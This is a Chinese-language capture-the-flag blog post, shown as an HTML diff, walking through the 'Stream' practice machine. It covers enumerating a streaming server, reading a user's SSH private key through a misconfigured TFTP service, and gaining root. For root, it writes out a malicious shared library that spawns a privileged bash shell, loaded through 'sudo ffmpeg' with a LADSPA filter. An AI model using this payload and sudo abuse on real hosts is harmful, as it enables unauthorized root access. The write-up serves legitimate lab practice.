@@ -1,0 +1,358 @@
+<!DOCTYPE html>
+<html lang=en>
+<head>
+    <!-- so meta -->
+    <meta charset="utf-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="HandheldFriendly" content="True">
+    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=5" />
+    <meta name="description" content="userflag 目录爆破基本上没得到啥信息  80没得到什么有效信息看看其它的，流媒体服务器。 流媒体服务器（Media Streaming Server） 是一种专门用来 传输音视频流 的服务器。 这里的8888和8889都是支持网页去看视频的，然后另外两个端口分别是通过rtmp和rtsp。所以我们去枚举一下接口发现&#x2F;live有个视频 1234http:&#x2F;&#x2F;192.168.3.13:">
+<meta property="og:type" content="article">
+<meta property="og:title" content="靶机Stream">
+<meta property="og:url" content="https://rufeii.github.io/2026/03/15/%E9%9D%B6%E6%9C%BAStream/index.html">
+<meta property="og:site_name" content="Rufeii">
+<meta property="og:description" content="userflag 目录爆破基本上没得到啥信息  80没得到什么有效信息看看其它的，流媒体服务器。 流媒体服务器（Media Streaming Server） 是一种专门用来 传输音视频流 的服务器。 这里的8888和8889都是支持网页去看视频的，然后另外两个端口分别是通过rtmp和rtsp。所以我们去枚举一下接口发现&#x2F;live有个视频 1234http:&#x2F;&#x2F;192.168.3.13:">
+<meta property="og:locale" content="en_US">
+<meta property="og:image" content="https://rufeii.github.io/images/achieve/2026/1/image-20260315194546800.png">
+<meta property="og:image" content="https://rufeii.github.io/images/achieve/2026/1/image-20260315194912819.png">
+<meta property="og:image" content="https://rufeii.github.io/images/achieve/2026/1/image-20260315200152921.png">
+<meta property="og:image" content="https://rufeii.github.io/images/achieve/2026/1/image-20260315200437071.png">
+<meta property="og:image" content="https://rufeii.github.io/images/achieve/2026/1/image-20260315201400861.png">
+<meta property="og:image" content="https://rufeii.github.io/images/achieve/2026/1/image-20260315203026510.png">
+<meta property="og:image" content="https://rufeii.github.io/images/achieve/2026/1/image-20260315203252774.png">
+<meta property="og:image" content="https://rufeii.github.io/images/achieve/2026/1/image-20260315203336838.png">
+<meta property="og:image" content="https://rufeii.github.io/images/achieve/2026/1/image-20260315204242936.png">
+<meta property="article:published_time" content="2026-03-15T11:39:32.000Z">
+<meta property="article:modified_time" content="2026-03-15T12:47:59.551Z">
+<meta property="article:author" content="Rufeii">
+<meta property="article:tag" content="sudo提取">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="https://rufeii.github.io/images/achieve/2026/1/image-20260315194546800.png">
+    
+    
+      
+        
+          <link rel="shortcut icon" href="/images/website.jpg">
+        
+      
+      
+        
+          <link rel="icon" type="image/png" href="/images/website.jpg" sizes="192x192">
+        
+      
+      
+        
+          <link rel="apple-touch-icon" sizes="180x180" href="/images/website.jpg">
+        
+      
+    
+    <!-- title -->
+    <title>靶机Stream</title>
+    <!-- async scripts -->
+    <!-- Google Analytics -->
+
+
+    <!-- Umami Analytics -->
+
+
+    <!-- styles -->
+    
+<link rel="stylesheet" href="/css/style.css">
+
+    <!-- persian styles -->
+    
+    <!-- rss -->
+    
+    
+	<!-- mathjax -->
+	
+<meta name="generator" content="Hexo 7.3.0"></head>
+
+<body class="max-width mx-auto px3 ltr">
+    
+      <div id="header-post">
+  <a id="menu-icon" href="#" aria-label="Menu"><i class="fa-solid fa-bars fa-lg"></i></a>
+  <a id="menu-icon-tablet" href="#" aria-label="Menu"><i class="fa-solid fa-bars fa-lg"></i></a>
+  <a id="top-icon-tablet" href="#" aria-label="Top" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');" style="display:none;"><i class="fa-solid fa-chevron-up fa-lg"></i></a>
+  <span id="menu">
+    <span id="nav">
+      <ul>
+        <!--
+       --><li><a href="/">h0me</a></li><!--
+     --><!--
+       --><li><a href="/about/">ab0ut</a></li><!--
+     --><!--
+       --><li><a href="/categories/">categ0ries</a></li><!--
+     --><!--
+       --><li><a href="/tags/">tags</a></li><!--
+     --><!--
+       --><li><a href="/links/">links</a></li><!--
+     --><!--
+       --><li><a href="/search/">Search</a></li><!--
+     -->
+      </ul>
+    </span>
+    <br/>
+    <span id="actions">
+      <ul>
+        
+        
+        <li><a class="icon" aria-label="Next post" href="/2026/03/12/%E9%9D%B6%E6%9C%BAjosJs/"><i class="fa-solid fa-chevron-right" aria-hidden="true" onmouseover="$('#i-next').toggle();" onmouseout="$('#i-next').toggle();"></i></a></li>
+        
+        <li><a class="icon" aria-label="Back to top" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');"><i class="fa-solid fa-chevron-up" aria-hidden="true" onmouseover="$('#i-top').toggle();" onmouseout="$('#i-top').toggle();"></i></a></li>
+        <li><a class="icon" aria-label="Share post" href="#"><i class="fa-solid fa-share-alt" aria-hidden="true" onmouseover="$('#i-share').toggle();" onmouseout="$('#i-share').toggle();" onclick="$('#share').toggle();return false;"></i></a></li>
+      </ul>
+      <span id="i-prev" class="info" style="display:none;">Previous post</span>
+      <span id="i-next" class="info" style="display:none;">Next post</span>
+      <span id="i-top" class="info" style="display:none;">Back to top</span>
+      <span id="i-share" class="info" style="display:none;">Share post</span>
+    </span>
+    <br/>
+    <div id="share" style="display: none">
+      <ul>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.facebook.com/sharer.php?u=https://rufeii.github.io/2026/03/15/%E9%9D%B6%E6%9C%BAStream/"><i class="fab fa-facebook " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://twitter.com/share?url=https://rufeii.github.io/2026/03/15/%E9%9D%B6%E6%9C%BAStream/&text=靶机Stream"><i class="fab fa-twitter " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.linkedin.com/shareArticle?url=https://rufeii.github.io/2026/03/15/%E9%9D%B6%E6%9C%BAStream/&title=靶机Stream"><i class="fab fa-linkedin " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://pinterest.com/pin/create/bookmarklet/?url=https://rufeii.github.io/2026/03/15/%E9%9D%B6%E6%9C%BAStream/&is_video=false&description=靶机Stream"><i class="fab fa-pinterest " aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="mailto:?subject=靶机Stream&body=Check out this article: https://rufeii.github.io/2026/03/15/%E9%9D%B6%E6%9C%BAStream/"><i class="fa-solid fa-envelope " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://getpocket.com/save?url=https://rufeii.github.io/2026/03/15/%E9%9D%B6%E6%9C%BAStream/&title=靶机Stream"><i class="fab fa-get-pocket " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://reddit.com/submit?url=https://rufeii.github.io/2026/03/15/%E9%9D%B6%E6%9C%BAStream/&title=靶机Stream"><i class="fab fa-reddit " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.stumbleupon.com/submit?url=https://rufeii.github.io/2026/03/15/%E9%9D%B6%E6%9C%BAStream/&title=靶机Stream"><i class="fab fa-stumbleupon " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://digg.com/submit?url=https://rufeii.github.io/2026/03/15/%E9%9D%B6%E6%9C%BAStream/&title=靶机Stream"><i class="fab fa-digg " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.tumblr.com/share/link?url=https://rufeii.github.io/2026/03/15/%E9%9D%B6%E6%9C%BAStream/&name=靶机Stream&description="><i class="fab fa-tumblr " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://news.ycombinator.com/submitlink?u=https://rufeii.github.io/2026/03/15/%E9%9D%B6%E6%9C%BAStream/&t=靶机Stream"><i class="fab fa-hacker-news " aria-hidden="true"></i></a></li>
+</ul>
+
+    </div>
+    
+    
+      <div id="toc">
+        <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#userflag"><span class="toc-number">1.</span> <span class="toc-text">userflag</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#rootflag"><span class="toc-number">2.</span> <span class="toc-text">rootflag</span></a></li></ol>
+      </div>
+    
+  </span>
+</div>
+
+    
+    <div class="content index py4 ">
+        
+        <article class="post h-entry" itemscope itemtype="http://schema.org/BlogPosting">
+  <header>
+    
+    <h1 class="posttitle p-name" itemprop="name headline">
+        靶机Stream
+    </h1>
+
+
+
+    <div class="meta">
+      <span class="author p-author h-card" itemprop="author" itemscope itemtype="http://schema.org/Person">
+        <span class="p-name" itemprop="name">Rufeii</span>
+      </span>
+      
+    <div class="postdate">
+      
+        <time datetime="2026-03-15T11:39:32.000Z" class="dt-published" itemprop="datePublished">2026-03-15</time>
+        
+      
+    </div>
+
+
+      
+    <div class="article-category">
+        <i class="fa-solid fa-archive"></i>
+        <a class="category-link" href="/categories/%E6%B8%97%E9%80%8F/">渗透</a>
+    </div>
+
+
+      
+    <div class="article-tag">
+        <i class="fa-solid fa-tag"></i>
+        <a class="p-category" href="/tags/sudo%E6%8F%90%E5%8F%96/" rel="tag">sudo提取</a>
+    </div>
+
+
+    </div>
+  </header>
+  
+
+  <div class="content e-content" itemprop="articleBody">
+    <h2 id="userflag"><a href="#userflag" class="headerlink" title="userflag"></a>userflag</h2><p><img src="/../images/achieve/2026/1/image-20260315194546800.png" alt="image-20260315194546800"></p>
+<p>目录爆破基本上没得到啥信息</p>
+<p><img src="/../images/achieve/2026/1/image-20260315194912819.png" alt="image-20260315194912819"></p>
+<p>80没得到什么有效信息看看其它的，流媒体服务器。</p>
+<p><strong>流媒体服务器（Media Streaming Server）</strong> 是一种专门用来 <strong>传输音视频流</strong> 的服务器。</p>
+<p>这里的8888和8889都是支持网页去看视频的，然后另外两个端口分别是通过rtmp和rtsp。所以我们去枚举一下接口发现&#x2F;live有个视频</p>
+<figure class="highlight tex"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">http://192.168.3.13:8888/live</span><br><span class="line">http://192.168.3.13:8889/live</span><br><span class="line">ffplay rtmp://10.27.220.191:1935/live</span><br><span class="line">ffplay rtsp://192.168.3.13:8554/live</span><br></pre></td></tr></table></figure>
+
+<p>四种方式都可以拿到视频</p>
+<p><img src="/../images/achieve/2026/1/image-20260315200152921.png" alt="image-20260315200152921"></p>
+<p>拿去ssh试试，发现ok，那么就直接读userflag即可</p>
+<h2 id="rootflag"><a href="#rootflag" class="headerlink" title="rootflag"></a>rootflag</h2><p>接着就是提权</p>
+<p><img src="/../images/achieve/2026/1/image-20260315200437071.png" alt="image-20260315200437071"></p>
+<p>UDP 69 是TFTP的默认端口</p>
+<p><strong>TFTP 服务</strong>是一个非常简单的文件传输服务。sudo和suid都没有，看看进程<code>ps aux</code></p>
+<p><img src="/../images/achieve/2026/1/image-20260315201400861.png" alt="image-20260315201400861"></p>
+<p>root以treadin的身份去启动tftp，去连接一下本地的tftp(启动命令里不加 <code>-s</code>，TFTP 服务的「根目录」会变成<strong>运行用户的家目录</strong>)</p>
+<p>连上之后我们尝试去看看treadin有没有ssh的密钥</p>
+<p><img src="/../images/achieve/2026/1/image-20260315203026510.png" alt="image-20260315203026510"></p>
+<p>get到公钥认证文件，同时我们也知道了是要的文件名id_ed25519，get到复制到kali</p>
+<p><img src="/../images/achieve/2026/1/image-20260315203252774.png" alt="image-20260315203252774"></p>
+<p><img src="/../images/achieve/2026/1/image-20260315203336838.png" alt="image-20260315203336838"></p>
+<p>咋和前面那个靶机提权思路类似哈哈，靶机貌似没有gcc，不过没关系，我们到kali上用就行</p>
+<figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">cat</span> &lt;&lt; <span class="string">EOF &gt; /tmp/shell.c</span></span><br><span class="line"><span class="string">#include &lt;stdlib.h&gt;</span></span><br><span class="line"><span class="string">#include &lt;unistd.h&gt;</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">__attribute__((constructor)) void init() &#123;</span></span><br><span class="line"><span class="string">    setuid(0);</span></span><br><span class="line"><span class="string">    setgid(0);</span></span><br><span class="line"><span class="string">    system(&quot;/bin/bash -p&quot;);</span></span><br><span class="line"><span class="string">&#125;</span></span><br><span class="line"><span class="string">EOF</span></span><br><span class="line"></span><br><span class="line">gcc -shared -fPIC /tmp/shell.c -o /tmp/shell.so</span><br><span class="line"></span><br><span class="line">scp -i <span class="built_in">test</span> shell.so treadin@target:/tmp/</span><br></pre></td></tr></table></figure>
+
+<p>回到靶机</p>
+<figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">sudo</span> ffmpeg -f lavfi -i anullsrc -af <span class="string">&quot;ladspa=file=/tmp/shell.so&quot;</span> -f null -</span><br></pre></td></tr></table></figure>
+
+<p><img src="/../images/achieve/2026/1/image-20260315204242936.png" alt="image-20260315204242936"></p>
+
+  </div>
+</article>
+
+
+
+        
+          <div id="footer-post-container">
+  <div id="footer-post">
+
+    <div id="nav-footer" style="display: none">
+      <ul>
+        
+          <li><a href="/">h0me</a></li>
+        
+          <li><a href="/about/">ab0ut</a></li>
+        
+          <li><a href="/categories/">categ0ries</a></li>
+        
+          <li><a href="/tags/">tags</a></li>
+        
+          <li><a href="/links/">links</a></li>
+        
+          <li><a href="/search/">Search</a></li>
+        
+      </ul>
+    </div>
+
+    
+    
+      <div id="toc-footer" style="display: none">
+        <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#userflag"><span class="toc-number">1.</span> <span class="toc-text">userflag</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#rootflag"><span class="toc-number">2.</span> <span class="toc-text">rootflag</span></a></li></ol>
+      </div>
+    
+
+    <div id="share-footer" style="display: none">
+      <ul>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.facebook.com/sharer.php?u=https://rufeii.github.io/2026/03/15/%E9%9D%B6%E6%9C%BAStream/"><i class="fab fa-facebook fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://twitter.com/share?url=https://rufeii.github.io/2026/03/15/%E9%9D%B6%E6%9C%BAStream/&text=靶机Stream"><i class="fab fa-twitter fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.linkedin.com/shareArticle?url=https://rufeii.github.io/2026/03/15/%E9%9D%B6%E6%9C%BAStream/&title=靶机Stream"><i class="fab fa-linkedin fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://pinterest.com/pin/create/bookmarklet/?url=https://rufeii.github.io/2026/03/15/%E9%9D%B6%E6%9C%BAStream/&is_video=false&description=靶机Stream"><i class="fab fa-pinterest fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="mailto:?subject=靶机Stream&body=Check out this article: https://rufeii.github.io/2026/03/15/%E9%9D%B6%E6%9C%BAStream/"><i class="fa-solid fa-envelope fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://getpocket.com/save?url=https://rufeii.github.io/2026/03/15/%E9%9D%B6%E6%9C%BAStream/&title=靶机Stream"><i class="fab fa-get-pocket fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://reddit.com/submit?url=https://rufeii.github.io/2026/03/15/%E9%9D%B6%E6%9C%BAStream/&title=靶机Stream"><i class="fab fa-reddit fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.stumbleupon.com/submit?url=https://rufeii.github.io/2026/03/15/%E9%9D%B6%E6%9C%BAStream/&title=靶机Stream"><i class="fab fa-stumbleupon fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://digg.com/submit?url=https://rufeii.github.io/2026/03/15/%E9%9D%B6%E6%9C%BAStream/&title=靶机Stream"><i class="fab fa-digg fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.tumblr.com/share/link?url=https://rufeii.github.io/2026/03/15/%E9%9D%B6%E6%9C%BAStream/&name=靶机Stream&description="><i class="fab fa-tumblr fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://news.ycombinator.com/submitlink?u=https://rufeii.github.io/2026/03/15/%E9%9D%B6%E6%9C%BAStream/&t=靶机Stream"><i class="fab fa-hacker-news fa-lg" aria-hidden="true"></i></a></li>
+</ul>
+
+    </div>
+
+    <div id="actions-footer">
+        <a id="menu" class="icon" href="#" onclick="$('#nav-footer').toggle();return false;"><i class="fa-solid fa-bars fa-lg" aria-hidden="true"></i> Menu</a>
+        
+          <a id="toc" class="icon" href="#" onclick="$('#toc-footer').toggle();return false;"><i class="fa-solid fa-list fa-lg" aria-hidden="true"></i> TOC</a>
+        
+        <a id="share" class="icon" href="#" onclick="$('#share-footer').toggle();return false;"><i class="fa-solid fa-share-alt fa-lg" aria-hidden="true"></i> Share</a>
+        <a id="top" style="display:none" class="icon" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');"><i class="fa-solid fa-chevron-up fa-lg" aria-hidden="true"></i> Top</a>
+    </div>
+
+  </div>
+</div>
+
+        
+        <footer id="footer">
+  <div class="footer-left">
+    Copyright &copy;
+    
+    
+    2025-2026
+    Rufeii
+  </div>
+  <div class="footer-right">
+    <nav>
+      <ul>
+        <li><a href="/">h0me</a></li><li><a href="/about/">ab0ut</a></li><li><a href="/categories/">categ0ries</a></li><li><a href="/tags/">tags</a></li><li><a href="/links/">links</a></li><li><a href="/search/">Search</a></li>
+      </ul>
+      <ul>
+            
+              <span id="busuanzi_container_site_pv">
+                  本站总访问量<span id="busuanzi_value_site_pv"></span>次
+              </span>
+              <span class="post-meta-divider">|</span>
+              <span id="busuanzi_container_site_uv" style='display:none'>
+                      本站访客数<span id="busuanzi_value_site_uv"></span>人
+              </span>
+              
+            
+      </ul>
+    </nav>
+  </div>
+</footer>
+    </div>
+    <!-- styles -->
+
+
+
+  <link rel="preload" as="style" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css" crossorigin="anonymous" onload="this.onload=null;this.rel='stylesheet'"/>
+
+
+    <!-- jquery -->
+
+  <script src="https://cdnjs.cloudflare.com/ajax/libs/jquery/3.6.0/jquery.min.js" crossorigin="anonymous"></script>
+
+
+
+
+<!-- clipboard -->
+
+  
+    <script src="https://cdnjs.cloudflare.com/ajax/libs/clipboard.js/2.0.7/clipboard.min.js" crossorigin="anonymous"></script>
+  
+  <script type="text/javascript">
+  $(function() {
+    // copy-btn HTML
+    var btn = "<span class=\"btn-copy tooltipped tooltipped-sw\" aria-label=\"Copy to clipboard!\">";
+    btn += '<i class="fa-regular fa-clone"></i>';
+    btn += '</span>';
+    // mount it!
+    $(".highlight table").before(btn);
+    var clip = new ClipboardJS('.btn-copy', {
+      text: function(trigger) {
+        return Array.from(trigger.nextElementSibling.querySelectorAll('.code')).reduce((str,it)=>str+it.innerText+'\n','')
+      }
+    });
+    clip.on('success', function(e) {
+      e.trigger.setAttribute('aria-label', "Copied!");
+      e.clearSelection();
+    })
+  })
+  </script>
+
+
+<script src="/js/main.js"></script>
+
+<!-- search -->
+
+<!-- Baidu Analytics -->
+
+<!-- Cloudflare Analytics -->
+
+<!-- Disqus Comments -->
+
+<!-- utterances Comments -->
+
+
+<script async src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script>
+</body>
+</html>
